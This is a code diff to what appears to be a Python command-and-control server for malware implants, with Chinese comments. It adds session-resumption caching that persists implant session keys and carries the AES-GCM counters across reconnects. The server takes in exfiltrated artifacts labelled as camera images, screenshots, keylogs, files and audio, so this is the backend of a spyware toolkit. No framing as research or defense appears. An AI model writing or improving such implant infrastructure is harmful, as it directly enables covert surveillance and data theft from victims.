@@ -32,6 +32,7 @@ from key_derivation import (
 )
 from frame import (SealedEnvelope, ReplayWindow, ReplayKey, InvalidFrame,
                    ROLE_CLIENT, ROLE_SERVER)
+from session_cache import SessionCache, CacheError
 from exfil_sink import (ExfilSink, ExfilError, CELL_WIRE,
                         EXF_TYPE_CAMERA_JPEG, EXF_TYPE_SCREENSHOT,
                         EXF_TYPE_KEYLOG, EXF_TYPE_FILE, EXF_TYPE_AUDIO)
@@ -100,6 +101,7 @@ class SessionState:
         self.k_c2s: Optional[bytes] = None   # 会话密钥：植入端 -> 服务端
         self.k_s2c: Optional[bytes] = None   # 会话密钥：服务端 -> 植入端
         self.exfil_sink = None     # 采集产物接收端（惰性建立）
+        self.resumed = False       # 是否由缓存恢复（而非重新握手）
         self.created_at = time.time()
 
 
@@ -118,7 +120,15 @@ class C2Server:
     """
 
     def __init__(self, psk: bytes, salt_reg: bytes, server_static_id: bytes,
-                 replay_capacity: int = 1024, store=None, artifact_dir: Optional[str] = None):
+                 replay_capacity: int = 1024, store=None,
+                 artifact_dir: Optional[str] = None,
+                 cache: Optional[SessionCache] = None,
+                 cache_path: Optional[str] = None):
+        """cache 非空时启用会话恢复；cache_path 非空时额外落盘持久化。
+
+        两者都给才算"跨进程可恢复"：只有 cache 则服务重启即失忆，
+        只有 cache_path 而没有 cache 对象则无处加载。
+        """
         if len(psk) < 16:
             raise ValueError("PSK must be >= 128 bits")
         if len(salt_reg) != HKDF_SALT_REG_LEN:
@@ -135,6 +145,18 @@ class C2Server:
         self._artifact_dir = artifact_dir
         if artifact_dir:
             os.makedirs(artifact_dir, exist_ok=True)
+
+        # 会话恢复缓存（可选）。master 用 k_identity 派生，与会话密钥域分离。
+        self._cache = cache
+        self._cache_path = cache_path
+        if cache is not None and cache_path:
+            try:
+                n = cache.load(cache_path)
+            except CacheError:
+                # 缓存损坏按"无缓存"处理：宁可全部重新握手，
+                # 也不能在半可信状态上恢复会话。
+                n = 0
+            self._cache_loaded = n
 
         # 会话表：implant_id -> SessionState
         self._sessions: Dict[str, SessionState] = {}
@@ -193,6 +215,71 @@ class C2Server:
         sess.k_c2s = k_c2s
         sess.k_s2c = k_s2c
         sess.state = SessionState.ESTABLISHED
+
+        # 落会话恢复缓存：重连时不必重新握手。
+        # 记的是当时的收发计数 —— 恢复必须带走计数器，归零即 IV 重用。
+        if self._cache is not None:
+            try:
+                self._cache.put(
+                    sess.implant_id, sess.generation,
+                    k_c2s, k_s2c,
+                    sess.seq_out, 0,
+                    self._cell_send_counter(sess), self._cell_recv_counter(sess))
+                if self._cache_path:
+                    self._cache.save(self._cache_path)
+            except CacheError:
+                # 缓存失败不得影响会话本身 —— 最坏退化为"下次重新握手"
+                pass
+
+    # ------------------------------------------------------------------
+    # 会话恢复
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def _cell_send_counter(sess: SessionState) -> int:
+        return 0 if sess.exfil_sink is None else sess.exfil_sink.counter
+
+    @staticmethod
+    def _cell_recv_counter(sess: SessionState) -> int:
+        # 服务端在回传通道上是接收方，其 counter 即信元流已接受的最大序号
+        return 0 if sess.exfil_sink is None else sess.exfil_sink.counter
+
+    def resume_session(self, implant_id: str) -> bool:
+        """从缓存恢复一个会话。成功返回 True，无缓存/已过期返回 False。
+
+        恢复的关键不是"省一次握手"，而是**计数器从断点续接**：
+        信元 IV = pfx || counter，归零会让重连后的 IV 与重连前重合，
+        同一密钥下 IV 重用 -> 两条密文异或即泄露明文异或（GCM 致命误用）。
+        """
+        if self._cache is None:
+            return False
+        try:
+            ent = self._cache.get(implant_id)
+        except CacheError:
+            return False
+        if ent is None:
+            return False
+
+        sess = SessionState(implant_id, ent["generation"])
+        sess.k_c2s = ent["k_c2s"]
+        sess.k_s2c = ent["k_s2c"]
+        sess.seq_out = ent["seq_out"]
+        sess.envelope = SealedEnvelope(sess.k_s2c, sess.k_c2s, ROLE_SERVER)
+        sess.state = SessionState.ESTABLISHED
+        sess.resumed = True
+        self._sessions[implant_id] = sess
+
+        # 回传通道按断点续接建立
+        sess.exfil_sink = ExfilSink.for_implant(
+            sess.k_c2s, sess.k_s2c, self._server_static_id, implant_id,
+            recv_counter=ent["cell_recv_ctr"])
+        return True
+
+    def save_cache(self) -> int:
+        """显式落盘缓存，返回条目数。未启用缓存返回 0。"""
+        if self._cache is None or not self._cache_path:
+            return 0
+        return self._cache.save(self._cache_path)
 
     # ------------------------------------------------------------------
     # 字节喂入入口
